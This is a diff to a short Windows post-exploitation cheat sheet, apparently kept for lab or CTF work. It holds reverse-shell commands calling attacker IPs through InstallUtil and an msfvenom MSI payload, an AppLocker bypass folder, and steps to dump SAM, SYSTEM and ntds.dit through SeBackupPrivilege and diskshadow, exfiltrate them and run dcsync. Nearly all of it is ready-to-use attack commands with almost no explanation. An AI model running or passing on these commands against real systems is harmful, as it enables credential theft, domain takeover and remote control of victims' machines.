@@ -17,3 +17,13 @@ Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' 
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\PSBypassCLM.exe     (Get a shell that bypasses CLM)
 
 c:\windows\system32\spool\drivers\color\     (folder that bypasses applocker)
+
+#(Abuse seBackupPrivilege/seRestorePrivilege) 
+#0 reg save hklm\sam sam; reg save hklm\system system
+#1 unix2dos shadowcopy.txt (in linux attacker machine)
+#2 upload shadowcopy to the machine
+#3 diskshadow /s shadowcopy.txt
+#4 robocopy /B E:\Windows\ntds .\ntds ntds.dit
+#5 exfiltrate the files and perform dcsync locally
+
+msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.4 LPORT=1339 -f msi > pwn.msi (abuse with msiexec /q /i pwn.msi in victim machine)
